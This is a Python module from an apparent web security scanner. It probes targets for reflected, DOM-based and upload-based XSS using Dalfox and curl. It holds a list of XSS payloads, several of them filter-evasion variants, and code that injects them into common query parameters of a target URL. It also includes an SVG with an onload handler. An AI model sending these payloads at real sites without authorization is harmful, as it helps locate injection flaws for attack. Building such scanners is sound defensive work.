"""
XSS Scanner Module — Cyberburg
Handles: Reflected XSS, Stored XSS, DOM XSS, dalfox integration
"""

import re
import urllib.parse
from utils.helpers import run_command, get_timestamp
from utils.tool_checker import check_tool
from utils.banner import print_info, print_success, print_warning, print_error
from rich.console import Console

console = Console()

# XSS Payloads
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<iframe src="javascript:alert(1)">',
    '"><svg/onload=alert(1)>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<IMG SRC="javascript:alert(\'XSS\');">',
    '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    '%3cscript%3ealert(1)%3c/script%3e',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<!--<script>alert(1)--!>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<details/open/ontoggle=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<audio src=1 onerror=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
]

# DOM XSS sources
DOM_XSS_SOURCES = [
    "document.URL", "document.documentURI", "document.URLUnencoded",
    "document.baseURI", "location", "location.href", "location.search",
    "location.hash", "location.pathname", "document.referrer",
    "window.name", "history.pushState", "history.replaceState",
    "localStorage", "sessionStorage", "IndexedDB", "Database",
]

DOM_XSS_SINKS = [
    "document.write", "document.writeln", "document.domain",
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "eval(", "setTimeout(", "setInterval(",
    "Function(", "execScript(", "execCommand(",
    "window.location", "document.location",
    "element.src", "element.href", "element.action",
    "jQuery.html(", "$.html(", "$(", ".html(",
]


def dalfox_scan(target: str) -> dict:
    """Run Dalfox XSS scanner."""
    result = {
        "module": "XSS Scan (Dalfox)",
        "target": target,
        "timestamp": get_timestamp(),
        "raw": "",
        "findings": []
    }

    if not check_tool("dalfox"):
        print_warning("dalfox not installed — using manual XSS probing")
        return manual_xss_scan(target)

    print_info(f"Running Dalfox XSS scan on {target}...")

    code, stdout, stderr = run_command(
        [
            "dalfox", "url", target,
            "--no-spinner",
            "--silence",
            "--format", "plain",
            "--timeout", "10",
            "--worker", "20",
            "--delay", "300",
        ],
        timeout=300
    )

    result["raw"] = stdout + stderr

    # Parse Dalfox findings
    for line in stdout.split('\n'):
        if '[V]' in line or 'VULN' in line.upper() or 'XSS' in line.upper():
            result["findings"].append({
                "type": "XSS Vulnerability (Dalfox)",
                "value": re.sub(r'\033\[[0-9;]*m', '', line).strip(),
                "severity": "HIGH"
            })
            print_error(f"XSS found: {line.strip()[:100]}")

    if not result["findings"]:
        result["findings"].append({
            "type": "XSS Scan",
            "value": "Dalfox found no reflected XSS vulnerabilities",
            "severity": "INFO"
        })

    print_success(f"Dalfox complete — {len(result['findings'])} findings")
    return result


def manual_xss_scan(target: str) -> dict:
    """Manual XSS testing with curl payloads."""
    result = {
        "module": "Manual XSS Probe",
        "target": target,
        "timestamp": get_timestamp(),
        "raw": "",
        "findings": []
    }

    if not check_tool("curl"):
        return result

    print_info(f"Manual XSS probing on {target}...")

    # Common reflection points
    test_params = ["q", "search", "s", "query", "id", "name", "input",
                   "value", "text", "message", "comment", "url", "redirect"]

    xss_found = False

    for param in test_params[:5]:  # Test first 5 params to stay fast
        for payload in XSS_PAYLOADS[:8]:  # Test first 8 payloads
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{target}?{param}={encoded_payload}"

            code, stdout, _ = run_command(
                ["curl", "-sL", "--max-time", "10",
                 "-H", "User-Agent: Mozilla/5.0",
                 test_url],
                timeout=20
            )

            result["raw"] += f"=== {param}={payload[:30]} ===\n{stdout[:200]}\n\n"

            # Check if payload is reflected unencoded in response
            if payload in stdout or payload.lower() in stdout.lower():
                # Verify it's in HTML context (not just in script/data)
                if any(tag in stdout for tag in ["<script>", "<img ", "<svg ", "<body ", "onerror", "onload"]):
                    if payload.replace('"', '').replace("'", "") in stdout:
                        result["findings"].append({
                            "type": "Reflected XSS",
                            "value": f"XSS payload reflected in parameter '{param}': {payload[:80]}",
                            "severity": "HIGH"
                        })
                        xss_found = True
                        print_error(f"HIGH: Reflected XSS in parameter '{param}'!")
                        break

    if not xss_found:
        result["findings"].append({
            "type": "XSS Probe",
            "value": "No obvious reflected XSS found with basic payloads",
            "severity": "INFO"
        })

    return result


def dom_xss_check(target: str) -> dict:
    """Check for DOM-based XSS by analyzing JS sources."""
    result = {
        "module": "DOM XSS Analysis",
        "target": target,
        "timestamp": get_timestamp(),
        "raw": "",
        "findings": []
    }

    if not check_tool("curl"):
        return result

    print_info(f"Checking for DOM XSS sources/sinks in {target}...")

    # Fetch main page
    code, html, _ = run_command(
        ["curl", "-sL", "--max-time", "20", target], timeout=30
    )

    # Extract JS file URLs
    js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html)

    all_js_content = html  # Start with inline JS

    # Fetch each JS file
    base_url = target.rstrip('/')
    for js_file in js_files[:10]:  # Limit to 10 JS files
        if not js_file.startswith('http'):
            js_url = f"{base_url}/{js_file.lstrip('/')}"
        else:
            js_url = js_file

        code, js_content, _ = run_command(
            ["curl", "-sL", "--max-time", "10", js_url], timeout=20
        )
        all_js_content += f"\n// === {js_file} ===\n{js_content}"

    result["raw"] = f"Analyzed {len(js_files)} JS files\n"

    # Check for dangerous DOM XSS patterns
    found_sources = []
    found_sinks = []

    for source in DOM_XSS_SOURCES:
        if source in all_js_content:
            found_sources.append(source)

    for sink in DOM_XSS_SINKS:
        if sink in all_js_content:
            found_sinks.append(sink)

    # Combined source+sink = potential DOM XSS
    if found_sources and found_sinks:
        result["findings"].append({
            "type": "Potential DOM XSS",
            "value": f"Dangerous source-sink pairs detected. Sources: {', '.join(found_sources[:5])}. Sinks: {', '.join(found_sinks[:5])}",
            "severity": "MEDIUM"
        })
        print_warning(f"Potential DOM XSS: {len(found_sources)} sources, {len(found_sinks)} sinks found")

    # Check for eval() usage
    eval_count = all_js_content.count('eval(')
    if eval_count > 0:
        result["findings"].append({
            "type": "Dangerous eval() Usage",
            "value": f"eval() used {eval_count} times in JS — potential code injection vector",
            "severity": "HIGH" if eval_count > 3 else "MEDIUM"
        })

    # Check for inline event handlers
    inline_events = re.findall(r'on\w+\s*=\s*["\'][^"\']*["\']', html)
    if len(inline_events) > 5:
        result["findings"].append({
            "type": "Multiple Inline Event Handlers",
            "value": f"{len(inline_events)} inline event handlers found — CSP bypass risk",
            "severity": "LOW"
        })

    if not result["findings"]:
        result["findings"].append({
            "type": "DOM XSS Check",
            "value": "No obvious DOM XSS patterns found",
            "severity": "INFO"
        })

    print_success("DOM XSS analysis complete")
    return result


def xss_via_file_upload(target: str) -> dict:
    """Test for XSS via file upload endpoints."""
    result = {
        "module": "XSS via File Upload",
        "target": target,
        "timestamp": get_timestamp(),
        "raw": "",
        "findings": []
    }

    if not check_tool("curl"):
        return result

    print_info(f"Testing file upload XSS vectors on {target}...")

    # Common upload endpoints
    upload_paths = ["/upload", "/uploads", "/file", "/files", "/media", "/images"]

    # Create SVG with XSS payload
    svg_xss = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle cx="50" cy="50" r="50"/></svg>'

    for path in upload_paths:
        upload_url = f"{target}{path}"

        # Check if upload endpoint exists
        code, stdout, _ = run_command(
            ["curl", "-sI", "--max-time", "8", upload_url, "-w", "%{http_code}", "-o", "/dev/null"],
            timeout=15
        )

        if stdout.strip() in ["200", "301", "302"]:
            result["findings"].append({
                "type": "Upload Endpoint Found",
                "value": f"File upload endpoint accessible: {upload_url}",
                "severity": "MEDIUM"
            })

    return result
